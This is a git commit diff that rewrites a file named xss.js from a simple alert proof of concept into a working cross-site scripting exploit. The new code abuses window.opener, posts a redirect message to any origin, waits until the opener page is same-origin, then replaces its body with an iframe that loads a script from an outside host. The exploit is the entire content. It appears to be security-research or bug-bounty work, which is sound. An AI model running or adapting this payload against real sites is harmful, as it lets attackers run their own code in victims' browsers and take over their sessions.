6236913ee6eeb0b40edbd6baa3f42cd68e31e336
Abdelfetah <62770167+abdelfetah18@users.noreply.github.com>
2025-08-23 19:48:13 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,18 @@
-alert(document.domain);
+    if (top.window.opener) {
+    // Change this to the full URL pointing to the script2.js file
+    var script_url = 'https://api.abdelfetah.dev/script1.js';
+
+    data = { action: "redirect", url: origin };
+    top.window.opener.postMessage(data, '*');
+
+    function sendExploit() {
+        clearInterval(checkLocation);
+        top.window.opener.document.body.innerHTML = `<iframe srcdoc="sss<script src='${script_url}'></script>"/>`
+    }
+
+    checkLocation = setInterval(() => {
+        if (top.window.opener.origin == origin) {
+            sendExploit();
+        }
+    }, 100);
+}
